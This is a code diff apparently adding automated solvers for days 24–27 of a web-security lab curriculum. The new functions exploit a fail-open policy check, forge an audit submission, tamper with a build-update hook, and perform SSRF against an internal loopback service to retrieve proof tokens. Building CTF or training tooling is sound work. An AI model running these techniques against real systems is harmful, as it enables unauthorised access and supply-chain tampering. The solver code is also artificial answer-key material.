@@ -1212,6 +1212,121 @@ def solve_proxy_header(target_url: str) -> str:
     raise WebHandlerError("Proxy header spoofing did not yield proof")
 
 
+def solve_fail_open_policy(target_url: str) -> str:
+    """Solve Fail Open policy inspection challenge (Day 24 curriculum)."""
+    base = target_url.rstrip("/")
+    import json, urllib.parse
+    s, pf_raw, _ = _request(f"{base}/api/policy-format")
+    prefix = ""
+    param = "policy"
+    if s == 200:
+        try:
+            pf = json.loads(pf_raw)
+            prefix = pf.get("prefix", "")
+            param = pf.get("query_parameter", "policy")
+        except Exception:
+            pass
+    s, clues_raw, _ = _request(f"{base}/api/clues")
+    feat = "/inspect"
+    if s == 200:
+        try:
+            clues = json.loads(clues_raw)
+            feat = clues.get("feature_route", feat)
+        except Exception:
+            pass
+    val = urllib.parse.quote(prefix + "invalid")
+    s, b, h = _request(f"{base}{feat}?{param}={val}")
+    proof = _extract_proof(b, h)
+    if proof:
+        return proof
+    raise WebHandlerError("Fail-open policy inspection did not yield proof")
+
+
+def solve_unlogged_breach(target_url: str) -> str:
+    """Solve unlogged breach export & audit challenge (Day 25 curriculum)."""
+    base = target_url.rstrip("/")
+    import json
+    s, clues_raw, _ = _request(f"{base}/api/clues")
+    feat = "/execute"
+    sec = "/audit"
+    if s == 200:
+        try:
+            clues = json.loads(clues_raw)
+            feat = clues.get("feature_route", feat)
+            sec = clues.get("secondary_route", sec)
+        except Exception:
+            pass
+    s, ex_res, _ = _request(f"{base}{feat}", method="POST", data=b"{}", headers={"Content-Type": "application/json"})
+    ex_id = ""
+    try:
+        ex_id = json.loads(ex_res).get("export_id", "")
+    except Exception:
+        pass
+    payload = {
+        "export_id": ex_id,
+        "missing_event": "protected_export",
+        "observed_event": "page_view"
+    }
+    s, audit_res, h = _request(f"{base}{sec}", method="POST", data=json.dumps(payload).encode("utf-8"), headers={"Content-Type": "application/json"})
+    proof = _extract_proof(audit_res, h)
+    if proof:
+        return proof
+    raise WebHandlerError("Unlogged breach audit comparison did not yield proof")
+
+
+def solve_tampered_build(target_url: str) -> str:
+    """Solve tampered build hook / supply-chain update challenge (Day 26 curriculum)."""
+    base = target_url.rstrip("/")
+    import json, copy
+    s, clues_raw, _ = _request(f"{base}/api/clues")
+    feat = "/inspect"
+    feed_route = "/api/updates"
+    if s == 200:
+        try:
+            clues = json.loads(clues_raw)
+            feat = clues.get("feature_route", feat)
+            feed_route = clues.get("update_feed", feed_route)
+        except Exception:
+            pass
+    s, feed_raw, _ = _request(f"{base}{feed_route}")
+    feed_obj = json.loads(feed_raw)["updates"][0]
+    payload = copy.deepcopy(feed_obj)
+    if isinstance(payload.get("artifact"), dict):
+        payload["artifact"]["hook"] = "privileged_export"
+    s, b, h = _request(f"{base}{feat}", method="POST", data=json.dumps(payload).encode("utf-8"), headers={"Content-Type": "application/json"})
+    proof = _extract_proof(b, h)
+    if proof:
+        return proof
+    raise WebHandlerError("Tampered build update did not yield proof")
+
+
+def solve_ssrf_internal(target_url: str) -> str:
+    """Solve SSRF to internal loopback case directory service (Day 27 curriculum)."""
+    base = target_url.rstrip("/")
+    import json, urllib.parse
+    s, clues_raw, _ = _request(f"{base}/api/clues")
+    feat = "/submit"
+    if s == 200:
+        try:
+            clues = json.loads(clues_raw)
+            feat = clues.get("feature_route", feat)
+        except Exception:
+            pass
+    s, cases_raw, _ = _request(f"{base}/api/cases")
+    cases = json.loads(cases_raw).get("cases", [])
+    exec_id = next((x["id"] for x in cases if x.get("owner") == "executive"), cases[-1]["id"])
+    s, topo_raw, _ = _request(f"{base}/api/topology")
+    topo = json.loads(topo_raw)
+    cs = topo.get("case_service", "http://127.0.0.1:8080/status")
+    ssrf_target = f"{cs}?id={exec_id}"
+    q = urllib.parse.quote(ssrf_target)
+    s, b, h = _request(f"{base}{feat}?target={q}")
+    proof = _extract_proof(b, h)
+    if proof:
+        return proof
+    raise WebHandlerError("Internal case SSRF did not yield proof")
+
+
 # ---------------------------------------------------------------------------
 # Handler Registry & Dynamic Dispatcher
 # ---------------------------------------------------------------------------
@@ -1239,6 +1354,10 @@ CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
     21: solve_race_condition,
     22: solve_websocket_stream,
     23: solve_proxy_header,
+    24: solve_fail_open_policy,
+    25: solve_unlogged_breach,
+    26: solve_tampered_build,
+    27: solve_ssrf_internal,
 }
 
 
@@ -1263,6 +1382,30 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
 
             if "recovery_guide_route" in clues or "recovery" in clues_body:
                 return solve_password_reset(target_url)
+
+            if "policy" in clues_body or "/api/policy-format" in clues_body or framework == "ASP.NET Core":
+                try:
+                    return solve_fail_open_policy(target_url)
+                except Exception:
+                    pass
+
+            if framework == "Slim" and ("audit" in clues_body or "export" in clues_body):
+                try:
+                    return solve_unlogged_breach(target_url)
+                except Exception:
+                    pass
+
+            if "update_feed" in clues or "/api/updates" in clues_body or framework == "Fiber":
+                try:
+                    return solve_tampered_build(target_url)
+                except Exception:
+                    pass
+
+            if "case_directory_route" in clues or "topology_route" in clues or framework == "Ktor":
+                try:
+                    return solve_ssrf_internal(target_url)
+                except Exception:
+                    pass
 
             if "state_format_route" in clues or framework == "Quarkus" or "state_format" in clues_body:
                 return solve_deserialization(target_url)
